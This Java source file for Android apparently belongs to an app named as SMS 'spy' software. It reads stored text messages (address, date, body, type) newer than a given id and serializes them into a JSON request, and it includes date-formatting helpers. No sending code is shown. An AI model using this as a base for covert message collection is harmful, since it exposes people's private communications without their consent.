package com.example.sms.timer.spy;

import java.util.Calendar;
import java.util.Date;
import java.util.TimeZone;

import org.json.JSONArray;
import org.json.JSONObject;

import adre310.x10.mx.Serialization.Json.AbstractSerialization;
import android.content.Context;
import android.database.Cursor;

public class SerialSMS extends AbstractSerialization {
	private static final int DATE = 1;
    private static final int TIME = 2;
    private static final int DATE_TIME = 3;

	private final long lastId;
	private final Context context;
	
	private static String[] projection=new String[] {
		"_id",
		"address",
		"date",
		"body",
		"type"
	};
	
	public SerialSMS(Context context, long lastId) {
		this.context=context;
		this.lastId=lastId;
	}
	
	@Override
	protected JSONObject handleJsonRequest() throws Exception {
		Cursor c=context.getContentResolver().query(
				MyDBProvider.CONTENT_URI_MY, 
				projection, 
				"_id >"+Long.toString(this.lastId), null, "_id ASC");

		JSONObject request=new JSONObject();
	    JSONArray arr=new JSONArray();
	    
		while (c.moveToNext()) {
			JSONObject o=new JSONObject();
			o.put("id", c.getLong(0));
			o.put("date", dateToString(new Date(c.getLong(2)), DATE_TIME) );
			o.put("address", c.getString(1));
			o.put("body", c.getString(3));
			o.put("type", c.getString(4));
			arr.put(o);
	    }
	    
		request.put("sms", arr);
		return request;
	}

    private String dateToString(Date date, int type) {

        Calendar c = Calendar.getInstance();
        c.setTimeZone(TimeZone.getTimeZone("GMT"));
        c.setTime(date);

        StringBuffer buf = new StringBuffer();

        if ((type & DATE) != 0) {
            int year = c.get(Calendar.YEAR);
            dd(buf, year / 100);
            dd(buf, year % 100);
            buf.append('-');
            dd(
                buf,
                c.get(Calendar.MONTH) - Calendar.JANUARY + 1);
            buf.append('-');
            dd(buf, c.get(Calendar.DAY_OF_MONTH));

            if (type == DATE_TIME)
                buf.append("T");
        }

        if ((type & TIME) != 0) {
            dd(buf, c.get(Calendar.HOUR_OF_DAY));
            buf.append(':');
            dd(buf, c.get(Calendar.MINUTE));
            buf.append(':');
            dd(buf, c.get(Calendar.SECOND));
            buf.append("+0000");
        }

        return buf.toString();
    }

    private Date stringToDate(String text, int type) {

        Calendar c = Calendar.getInstance();

        if ((type & DATE) != 0) {
            c.set(
                Calendar.YEAR,
                Integer.parseInt(text.substring(0, 4)));
            c.set(
                Calendar.MONTH,
                Integer.parseInt(text.substring(5, 7))
                    - 1
                    + Calendar.JANUARY);
            c.set(
                Calendar.DAY_OF_MONTH,
                Integer.parseInt(text.substring(8, 10)));

            if (type != DATE_TIME || text.length () < 11) {
				c.set(Calendar.HOUR_OF_DAY, 0);
				c.set(Calendar.MINUTE, 0);
				c.set(Calendar.SECOND, 0);            	
	            c.set(Calendar.MILLISECOND, 0);
	            return c.getTime();
            }
            text = text.substring(11);
        }
        else 
        	c.setTime(new Date(0));


        c.set(
            Calendar.HOUR_OF_DAY,
            Integer.parseInt(text.substring(0, 2)));
        // -11
        c.set(
            Calendar.MINUTE,
            Integer.parseInt(text.substring(3, 5)));
        c.set(
            Calendar.SECOND,
            Integer.parseInt(text.substring(6, 8)));

        int pos = 8;
        if (pos < text.length() && text.charAt(pos) == '.') {
            int ms = 0;
            int f = 100;
            while (true) {
                char d = text.charAt(++pos);
                if (d < '0' || d > '9')
                    break;
                ms += (d - '0') * f;
                f /= 10;
            }
            c.set(Calendar.MILLISECOND, ms);
        }
        else
            c.set(Calendar.MILLISECOND, 0);

        if (pos < text.length()) {

            if (text.charAt(pos) == '+'
                || text.charAt(pos) == '-')
                c.setTimeZone(
                    TimeZone.getTimeZone(
                        "GMT" + text.substring(pos)));

            else if (text.charAt(pos) == 'Z')
                c.setTimeZone(TimeZone.getTimeZone("GMT"));
            else
                throw new RuntimeException("illegal time format!");
        }

        return c.getTime();
    }
    
    private void dd(StringBuffer buf, int i) {
        buf.append((char) (((int) '0') + i / 10));
        buf.append((char) (((int) '0') + i % 10));
    }
	
}
